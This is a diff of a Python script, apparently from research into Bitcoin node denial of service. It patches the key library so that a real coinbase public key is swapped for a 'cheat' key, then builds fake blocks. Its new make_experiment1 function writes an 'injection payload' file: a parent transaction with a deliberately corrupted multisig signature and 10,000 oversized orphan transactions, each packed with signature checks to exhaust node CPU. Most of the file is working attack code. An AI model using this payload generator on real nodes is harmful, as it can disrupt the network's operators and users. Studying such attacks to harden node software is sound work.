@@ -1,13 +1,12 @@
 # Create and sign a transaction with a bogus key
 
-
-
+from binascii import hexlify, unhexlify
 from bitcoin.core import *
-from bitcoin.script import *
-from bitcoin.scripteval import *
-from bitcoin.key import *
+from bitcoin.core.key import *
+from bitcoin.core.script import *
+from bitcoin.core.scripteval import *
 from bitcoin import base58
-from cStringIO import StringIO
+from bitcoin.messages import *
 
 # ethalone keys
 #ec_secret = 'a0dc65ffca799873cbea0ac274015b9526505daaaed385155425f7337704883e'
@@ -17,17 +16,18 @@ def patched_set_pubkey(self, key):
     intercept = map(unhexlify, ['0496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858ee'])
     cheat = unhexlify('04d0de0aaeaefad02b8bdc8a01a1b8b11c696bd3d66a2c5f10780d95b7df42645cd85228a6fb29940e858e7e55842ae2bd115d1ed7cc0e82d934e929c97648cb0a')
     if key in intercept:
-        print 'cheating!'
+        #print 'cheating!'
         key = cheat
     self.mb = ctypes.create_string_buffer(key)
     ssl.o2i_ECPublicKey(ctypes.byref(self.k), ctypes.byref(ctypes.pointer(self.mb)), len(key))
 
-CKey.set_pubkey = patched_set_pubkey
+CECKey.set_pubkey = patched_set_pubkey
 
-k = CKey()
-k.generate (ec_secret.decode('hex'))
-print(k.get_privkey().encode('hex'))
-print(k.get_pubkey().encode('hex'))
+k = CECKey()
+k.set_compressed(True)
+k.set_secretbytes(ec_secret.decode('hex'))
+#print 'get_privkey:', k.get_privkey().encode('hex')
+#print 'get_pubkey:', k.get_pubkey().encode('hex')
 # not sure this is needed any more: print k.get_secret().encode('hex')
 
 class Transaction():
@@ -37,9 +37,21 @@ class Transaction():
         self._ctx = CTransaction()
 
     def append_txout(self, txout):
-        txout.tx = self
-        txout.idx = len(self._vout)
+        assert txout._tx is None and txout._idx is None
+        txout._tx = self
+        txout._idx = len(self._vout)
         self._vout.append(txout)
+        self._ctx.vout.append(txout._ctxout)
+
+    def finalize(self):
+        assert self._ctx.vin == []
+        for idx,txin in enumerate(self.vin):
+            ctxin = CTxIn(txin.txout.prevout)
+            self._ctx.vin.append(ctxin)
+        for idx,txin in enumerate(self.vin):
+            txfrom = txin.txout._tx._ctx
+            self._ctx.vin[idx].scriptSig = txin._finalize(txfrom, self._ctx, idx)
+        #self._ctx.calc_sha256()
 
 class TxOut():
     def __init__(self, scriptPubKey, nValue):
@@ -53,8 +65,7 @@ class TxOut():
     @property
     def prevout(self):
         assert self._tx is not None and self._idx is not None, "attempt to get prevout from an unhooked TxOut"
-        assert self._tx._ctx.sha256 is not None
-        return self._tx._ctx.sha256, self._idx
+        return COutPoint(Hash(self._tx._ctx.serialize()), self._idx)
 
     @property
     def nValue(self):
@@ -64,10 +75,6 @@ class TxIn():
     def __init__(self, txout, finalize):
         self.txout = txout
         self._finalize = finalize
-
-    def finalize(self):
-        assert self.txout.tx is not None
-        self._finalize()
 
 def tx_from_CTransaction(ctx):
     """
@@ -85,12 +92,34 @@ def tx_from_CTransaction(ctx):
         tx._vout.append(txout)
     return tx
 
-def tx_second():
-    second_coinbase = CTransaction()
-    second_coinbase.deserialize(StringIO(unhexlify("01000000010000000000000000000000000000000000000000000000000000000000000000ffffffff0704ffff001d0104ffffffff0100f2052a0100000043410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac00000000")))
-    second_coinbase.calc_sha256()
+def get_txin_second():
+    """
+    returns:
+       txout: a txout representing the second coinbase
+       sign:  signs a transaction spending this input
+    """
+    second_coinbase = CTransaction.deserialize(unhexlify("01000000010000000000000000000000000000000000000000000000000000000000000000ffffffff0704ffff001d0104ffffffff0100f2052a0100000043410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac00000000"))
+    scriptPubKey = CScript(unhexlify('410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac'))
     tx = tx_from_CTransaction(second_coinbase)
-    return tx
+    def sign(txfrom, ctx, idx):
+        sighash = SignatureHash(scriptPubKey, ctx, idx, SIGHASH_ALL)
+        sig = k.sign(sighash) + chr(SIGHASH_ALL)
+        assert len(sig) < OP_PUSHDATA1
+        scriptSig = CScript(chr(len(sig)) + sig)
+        # Go ahead and set the scriptSig in the transaction, so we can verify
+        ctx.vin[idx].scriptSig = scriptSig
+        try:
+            VerifySignature(txfrom, ctx, idx)
+        except VerifySignatureError as e:
+            print "Warning: signature did not verify"
+            print 'idx:', idx
+            print '>', txfrom
+            print '>', tx
+            print
+        return scriptSig
+    txout = tx._vout[0]
+    txin = TxIn(txout, sign)
+    return txin
 
 def tx_coinbase(height):
     # Makes a coinbase transaction with a single input
@@ -99,149 +128,140 @@ def tx_coinbase(height):
     ctxin.prevout.hash = 0L
     ctxin.prevout.n = 0xffffffff
     # after v2, coinbase scriptsig must begin with height
-    ctxin.scriptSig = chr(0x03) + struct.pack('<I', height)[:3] 
+    ctxin.scriptSig = CScript(chr(0x03) + struct.pack('<I', height)[:3])
     tx._ctx.vin.append(txin)
     return tx
 
-def txpair_from_pubkey():
+def txpair_from_pubkey(scriptPubKey=None,nValue=50*1e8):
     """
     returns:
-       txout: a txout containing a standard pay-to-pubkey (from coinbase #2)
+       txout: a txout containing a standard pay-to-pubkey
        sign:  signs the transaction (using an interposed key)
     """
-    txout = TxOut()
-    txout.scriptPubKey = CScript(unhexlify('410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac'))
+    if scriptPubKey is None:
+        # default scriptPubKey, from coinbase #2
+        scriptPubKey = CScript(unhexlify('410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac'))
+    txout = TxOut(scriptPubKey, nValue)
     def sign(txfrom, ctx, idx):
-        sighash, = SignatureHash(txout.scriptPubKey, ctx, idx, SIGHASH_ALL)
-        sighash = ser_uint256(sighash)
+        sighash = SignatureHash(scriptPubKey, ctx, idx, SIGHASH_ALL)
         sig = k.sign(sighash) + chr(SIGHASH_ALL)
         assert len(sig) < OP_PUSHDATA1
-        scriptSig = chr(len(sig)) + sig
-        # Go ahead and set the 
+        scriptSig = CScript(chr(len(sig)) + sig)
+        # Go ahead and set the scriptSig in the transaction, so we can verify
         ctx.vin[idx].scriptSig = scriptSig
-        if not VerifySignature(txfrom, tx, idx, SIGHASH_ALL):
+        try: 
+            VerifySignature(txfrom, ctx, idx)
+        except VerifySignatureError as e:
             print "Warning: signature did not verify"
         return scriptSig
-    return txout, sign
+    txin = TxIn(txout, sign)
+    return txout, txin
 
-def txin_from_second_coinbase():
+def txpair_from_p2sh(nValue=50*1e8):
     """
     returns:
-       txin: An (unsigned) CTxIn corresponding to the second coinbase bonus
-       sign(idx,tx): produces a signature on tx satisfying the scriptPubKey in txin
-           assumes that tx[idx] is txin
+       txout: a txout containing a standard pay-to-scripthash
+       sign:  signs the transaction (using an interposed key)
     """
-    # 
-    second_coinbase = CTransaction()
-    second_coinbase.deserialize(StringIO(unhexlify("01000000010000000000000000000000000000000000000000000000000000000000000000ffffffff0704ffff001d0104ffffffff0100f2052a0100000043410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac00000000")))
-    second_coinbase.calc_sha256()
-    txin = CTxIn()
-    txin.prevout.hash = second_coinbase.sha256
-    txin.prevout.n = 0
-    def sign(idx, tx):
-        assert tx.vin[idx] is txin, "Trying to sign wrong txinput"
-        scriptPubKey = CScript(unhexlify('410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac'))
-        key = k # The default key we use to sign the transaction
-        sighash, = SignatureHash(scriptPubKey, tx, idx, SIGHASH_ALL)
-        sighash = ser_uint256(sighash)
-        sig = key.sign(sighash) + chr(SIGHASH_ALL)
-        assert len(sig) < OP_PUSHDATA1
-        return chr(len(sig)) + sig
-    return txin, sign
 
-def sign_transaction(tx, scriptPubKey, key):
-    # Signing logic
-    for idx,txin in enumerate(tx.vin):
-        sighash, = SignatureHash(scriptPubKey, tx, idx, SIGHASH_SINGLE)
-        sighash = ser_uint256(sighash)
-        sig = key.sign(sighash) + chr(SIGHASH_SINGLE)
-        assert len(sig) < OP_PUSHDATA1
-        txin.scriptSig = chr(len(sig)) + sig
-        txfrom = CTransaction()
-        txfrom.deserialize(StringIO(unhexlify('01000000010000000000000000000000000000000000000000000000000000000000000000ffffffff0704ffff001d0104ffffffff0100f2052a0100000043410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac00000000')))
-        print txfrom
-        if not VerifySignature(txfrom, tx, idx, SIGHASH_SINGLE):
-            print "Warning: signature did not verify"
+    # Create a 15 (or 3) way multisig
+    n_sigs = 3
+    pk = k.get_pubkey()
+    redeemscript = CScript([n_sigs] + n_sigs*[pk] + [n_sigs, OP_CHECKMULTISIG])
+    redeemscripthash = Hash160(redeemscript)
+    scriptPubKey = CScript([OP_HASH160, redeemscripthash, OP_EQUAL])
+    txout = TxOut(scriptPubKey, nValue)
+
+    def sign(txfrom, ctx, idx):
+        sighash = SignatureHash(redeemscript, ctx, idx, SIGHASH_ALL)
+        sigs = [k.sign(sighash) + chr(SIGHASH_ALL) for _ in range(n_sigs)]
+        assert len(sigs[0]) < OP_PUSHDATA1
+        scriptSig = CScript([OP_0] + sigs + [redeemscript])
+        assert len(scriptSig) <= 1650 # This is 1650 for 0.9.3+, but the 0.9.2 limit is 500.
+        assert len(scriptSig) <= 500 
+        # Go ahead and set the scriptSig in the transaction, so we can verify
+        ctx.vin[idx].scriptSig = scriptSig
+        # try:
+        #     VerifySignature(txfrom, ctx, idx)
+        #     VerifyScript(scriptSig, scriptPubKey, ctx, idx, flags=(SCRIPT_VERIFY_P2SH,))
+        # except VerifySignatureError as e:
+        #     print "Warning: signature did not verify"
+        #     print e
+        return scriptSig
+    txin = TxIn(txout, sign)
+    return txout, txin
+
+def txpair_from_p2sh_dos(nValue=50*1e8, n_sigs=3):
+    # Create a 15 (or 3) way multisig
+    pk = k.get_pubkey()
+    redeemscript = CScript([n_sigs] + n_sigs*[pk] + [n_sigs, OP_CHECKMULTISIG])
+    redeemscripthash = Hash160(redeemscript)
+    scriptPubKey = CScript([OP_HASH160, redeemscripthash, OP_EQUAL])
+    txout = TxOut(scriptPubKey, nValue)
+
+    def sign(txfrom, ctx, idx):
+        sighash = SignatureHash(redeemscript, ctx, idx, SIGHASH_ALL)
+        sigs = [k.sign(sighash) + chr(SIGHASH_ALL) for _ in range(n_sigs)]
+        # Corrupt the last sig
+        sigs[0] = k.sign(Hash('')) + chr(SIGHASH_ALL)
+        scriptSig = CScript([OP_0] + sigs + [redeemscript])
+        assert len(scriptSig) <= 1650 # This is 1650 for 0.9.3+, but the 0.9.2 limit is 500.
+        assert len(scriptSig) <= 500 
+        # Go ahead and set the scriptSig in the transaction, so we can verify
+        ctx.vin[idx].scriptSig = scriptSig
+        # try:
+        #     VerifySignature(txfrom, ctx, idx)
+        #     VerifyScript(scriptSig, scriptPubKey, ctx, idx, flags=(SCRIPT_VERIFY_P2SH,))
+        # except (VerifySignatureError,VerifyScriptError) as e:
+        #     #print "DOS_Check: signature did not verify!"
+        #     #print e
+        #     pass
+        # else:
+        #     print "DOS_Check: signature verifies, but was meant to fail"
+        return scriptSig
+    txin = TxIn(txout, sign)
+    return txout, txin
 
 spent_coinbase_134 = "c48b46883778003413636b23233ab90179f7d45a756960858c3f63db517762bb"
-def spend_coinbase(txhash):
-    tx = CTransaction()
-    txin, sign = txin_from_second_coinbase()
-    txout = CTxOut()
-    txout.nValue = 50 * 1e8
-    txout.scriptPubKey = unhexlify('410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac')
-    tx.vin.append(txin)
-    tx.vout.append(txout)
-    tx.vin[0].scriptSig = sign(0,tx)    
-    #sign_transaction(tx, scriptPubKey, k)
-    return tx
-
 def spend_second_coinbase():
     # Create a transaction that spends the second coinbase
-    txhash = '0e3e2357e806b6cdb1f70b54c3a3a17b6714ee1f0e68bebb44a74b1efd512098'
-    return spend_coinbase(txhash)
+    txin_second = get_txin_second()
+    tx = Transaction()
+    tx.vin = [txin_second]
+    #txout, txin = txpair_from_pubkey()
+    txout, txin = txpair_from_p2sh()
+    tx.append_txout(txout)
+    tx.finalize()
+    return tx, txin
 
-def void_coinbase(height=0):
+def void_coinbase(height=0):    
     tx = CTransaction()
     txin = CTxIn()
-    txin.prevout.hash = 0L
-    txin.prevout.n = 0xffffffff
     txin.scriptSig = chr(0x03) + struct.pack('<I', height)[:3]
     txout = CTxOut()
     txout.nValue = 25*1e8
-    txout.scriptPubKey = unhexlify('76a91427a1f12771de5cc3b73941664b2537c15316be4388ac')
+    txout.scriptPubKey = CScript(unhexlify('76a91427a1f12771de5cc3b73941664b2537c15316be4388ac'))
     tx.vin.append(txin)
     tx.vout.append(txout)
     return tx
 
 def spend_p2sh():
-    # Create a 15 (or 5) way multisig
-    n_sigs = 3
-    k.set_compressed(True)
-    pk = k.get_pubkey()
-    def push_script(s):
-        assert len(s) <= 520
-        if len(s) < OP_PUSHDATA1: op = chr(len(s))
-        elif len(s) <= 255: op = chr(OP_PUSHDATA1) + struct.pack('<I', len(s))[:1]
-        else: op = chr(OP_PUSHDATA2) + struct.pack('<I', len(s))[:2]
-        return op + s
-    redeemscript = chr(OP_1+n_sigs-1) + n_sigs*(push_script(pk)) + chr(OP_1+n_sigs-1) + chr(OP_CHECKMULTISIG)
-    redeemscripthash = ser_uint160(Hash160(redeemscript))
-    scriptPubKey = chr(OP_HASH160) + push_script(redeemscripthash) + chr(OP_EQUAL)
+    # First transaction: spends 2nd coinbase, creates a p2sh output
+    txin_second = get_txin_second()
+    tx1 = Transaction()
+    tx1.vin = [txin_second]
+    tx1out, tx2in = txpair_from_p2sh()
+    tx1.append_txout(tx1out)
+    tx1.finalize()
 
-    def spend_coinbase(new_scriptPubKey):
-        # second coinbase transaction
-        txhash = '0e3e2357e806b6cdb1f70b54c3a3a17b6714ee1f0e68bebb44a74b1efd512098'
-        scriptPubKey = CScript(unhexlify('410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac'))
-        tx = CTransaction()
-        txin = CTxIn()
-        txin.prevout.hash = uint256_from_str(unhexlify(txhash)[::-1])
-        txin.prevout.n = 0
-        txout = CTxOut()
-        txout.nValue = 50 * 1e8
-        txout.scriptPubKey = new_scriptPubKey
-        tx.vin.append(txin)
-        tx.vout.append(txout)
-        sign_transaction(tx, scriptPubKey, k)
-        tx.calc_sha256()
-        return tx
+    # Second transaction: spends tx1's output, creates a pubkey output
+    tx2 = Transaction()
+    tx2.vin = [tx2in]
+    tx2out, _ = txpair_from_pubkey(nValue=1*COIN)
+    tx2.append_txout(tx2out)
+    tx2.finalize()
 
-    tx1 = spend_coinbase(scriptPubKey)
-    tx = CTransaction()
-    txin = CTxIn()
-    txin.prevout.hash = tx1.sha256
-    txin.prevout.n = 0
-    sig = k.sign('') + chr(SIGHASH_ALL)
-    assert len(sig) < OP_PUSHDATA1
-    txin.scriptSig = chr(OP_0) + n_sigs * push_script(sig) + push_script(redeemscript)
-    assert len(txin.scriptSig) <= 1650 # This is 1650 for 0.9.3+, but the 0.9.2 limit is 500.
-    assert len(txin.scriptSig) <= 500 
-    txout = CTxOut()
-    txout.nValue = 50 * 1e8
-    txout.scriptPubKey = scriptPubKey
-    tx.vin.append(txin)
-    tx.vout.append(txout)
-    return tx1,tx
+    return tx1,tx2
 
 def block_and_p2sh():
     tx1, tx2 = spend_p2sh()
@@ -251,29 +271,28 @@ def block_and_p2sh():
     nTime = 1401458326
     ver = 2
     block = CBlock()
-    block.hashPrevBlock = uint256_from_str(unhexlify(prevhash)[::-1])
+    block.hashPrevBlock = unhexlify(prevhash)[::-1]
     block.vtx.append(void_coinbase(height=height))
-    block.vtx.append(tx1)
+    block.vtx.append(tx1._ctx)
     block.nBits = nBits
     block.nNonce = 9999999 # Not a valid proof of work, but this is ok
     block.nTime = nTime
     block.nVersion = ver;
-    block.hashMerkleRoot = block.calc_merkle()
-    block.calc_sha256()
-    print 'block:', hexlify(block.serialize())
-    print 'blockhash:', hexlify(ser_uint256(block.sha256)[::-1])
-    print 'merkleroot:', hexlify(ser_uint256(block.hashMerkleRoot)[::-1])
-    tx1.calc_sha256()
-    print 'tx1:', hexlify(tx1.serialize())
-    print 'tx1hash:', hexlify(ser_uint256(tx1.sha256)[::-1]);
-    print 'tx2:', hexlify(tx2.serialize())
-    tx2.calc_sha256()
-    print 'tx2hash:', hexlify(ser_uint256(tx2.sha256)[::-1]);
+    block.hashMerkleRoot = block.calc_merkle_root()
     return block, tx2
 
 
 def block_with_spend():
-    tx = spend_second_coinbase()
+    # Get a first transaction that spends 2nd coinbase to a single output
+    tx1,txin = spend_second_coinbase()
+
+    # Create a second transaction that is all fees
+    tx2 = Transaction()
+    tx2.vin.append(txin)
+    txout,_ = txpair_from_pubkey(nValue=1e8)
+    tx2.append_txout(txout)
+    tx2.finalize()
+    
     if 0: # Builds on block 120594 on main chain
         prevhash = "0000000000004ba33ad245380d09ed2cf728753421550c23837ac3007ec4c25a"
         nBits = 453031340
@@ -287,43 +306,125 @@ def block_with_spend():
         nTime = 1401458326
         ver = 2
     block = CBlock()
-    block.hashPrevBlock = uint256_from_str(unhexlify(prevhash)[::-1])
+    block.hashPrevBlock = unhexlify(prevhash)[::-1]
     block.vtx.append(void_coinbase(height=height))
-    block.vtx.append(tx)
+    block.vtx.append(tx1._ctx)
     block.nBits = nBits
     block.nNonce = 9999999 # Not a valid proof of work, but this is ok
     block.nTime = nTime
     block.nVersion = ver;
-    block.hashMerkleRoot = block.calc_merkle()
-    return block
+    block.hashMerkleRoot = block.calc_merkle_root()
+    return block, tx2
 
 def address_from_key(key):
     p = k.get_pubkey()
-    pkh = '\x00' + ser_uint160(Hash160(p))
-    print 'pkh', pkh
-    chk = ser_uint256(Hash(pkh))[:4]
+    pkh = '\x00' + Hash160(p)
+    #print 'pkh', pkh
+    chk = Hash(pkh)[:4]
     return base58.encode(pkh+chk)
 
 def wif_from_key(key):
     p = k.prikey
     assert len(p) == 32
     p = '\x80' + p #+ '\x01'
-    print '2:', hexlify(p)
-    h = ser_uint256(Hash(p))
-    print '3:', hexlify(h)
+    h = Hash(p)
     chk = h[:4]
-    print '5:', hexlify(chk)
     return base58.encode(p+chk)
+
+def make_experiment1(path='./experiment1_payload.dat'):
+    """
+    Creates the injection payload for an experiment.
+    This experiment includes a block and a large number of orphans.
+    The main payload are transactions that
+     - contain the maximum size (100kb)
+     - all of the inputs contain the maximum number of ecdsa verifications 
+
+    1. Create enough txouts
+    """
+    # block, tx2 = block_with_spend()
+    # with open(path,'wb') as f:
+    #     m = msg_block()
+    #     m.block = block
+    #     f.write(m.serialize())
+
+    #     m = msg_tx()
+    #     m.tx = tx2._ctx
+    #     f.write(m.serialize())
+
+    # Chosen so that the size of the payload transactions is within 5kb
+    n_inputs = 13
+
+    # 1. Create a setup transaction with enough inputs for each payload (+2 boosters)
+    tx_setup = Transaction()
+    tx_setup.vin = [get_txin_second()]
+    tx_setup_ins = []
+
+    for i in range(n_inputs+2):
+        _out,_in = txpair_from_p2sh(nValue=0.01*COIN)
+        tx_setup.append_txout(_out)
+        tx_setup_ins.append(_in)
+    tx_setup.finalize()
+
+    # 1a. Add tx_setup to a block
+    print 'Step 1a.'
+    prevhash = "00000000000000005bb3427edaf9b435967c90a490f2b32cfa51f7c32db2397f" # Block 330334 on main chain
+    block = CBlock()
+    block.hashPrevBlock = unhexlify(prevhash)[::-1]
+    block.vtx.append(void_coinbase(height=303335))
+    block.vtx.append(tx_setup._ctx)
+    block.nBits = 409544770
+    block.nNonce = 9999999 # Not a valid proof of work, but this is ok
+    block.nTime = 1401458326
+    block.nVersion = 2
+    block.hashMerkleRoot = block.calc_merkle_root()
+
+
+    # 2. Create a "parent" transaction with one output
+    print 'Step 2.'
+    tx_parent = Transaction()
+    tx_parent.vin = [tx_setup_ins[-2]]
+    # This input will be the only invalid one
+    _tx_parent_out,tx_parent_in = txpair_from_p2sh_dos(nValue=0.01*COIN)
+    tx_parent.append_txout(_tx_parent_out)
+    tx_parent.finalize()
+
+    # 3. Create "orphan" payloads
+    print 'Step 3.'
+    tx_orphans = []
+    for i in range(10000):
+        # Create several bad transactions
+        tx = Transaction()
+        tx.vin = tx_setup_ins[:n_inputs-1] + [tx_parent_in]
+        txout,_ = txpair_from_p2sh(nValue=0.001*COIN)
+        tx.append_txout(txout)
+        tx.finalize()
+        tx_orphans.append(tx)
+        assert len(tx._ctx.serialize()) <= 5000
+
+    with open(path,'wb') as f:
+        m = msg_block()
+        m.block = block
+        f.write(m.serialize())
+
+        for tx in tx_orphans + [tx_parent]:
+            m = msg_tx()
+            m.tx = tx._ctx
+            f.write(m.serialize())
+    
     
 addr = address_from_key(k)
-print addr
+#print addr
 
-hash = 'Hello, world!'
-print(k.verify(hash, k.sign(hash)))
+hash = Hash('Hello, world!')
+#print(k.verify(hash, k.sign(hash)))
 
-tx = spend_second_coinbase()
-print 'tx:', tx
-print 'tx:', hexlify(tx.serialize())
+tx,txin = spend_second_coinbase()
+#print 'tx:', tx._ctx
+#print 'spend_second_coinbase():', hexlify(tx._ctx.serialize())
 
-blk = block_with_spend()
+blk,tx2 = block_and_p2sh()
 print 'blk:', hexlify(blk.serialize())
+print
+print 'tx2:', hexlify(tx2._ctx.serialize())
+
+
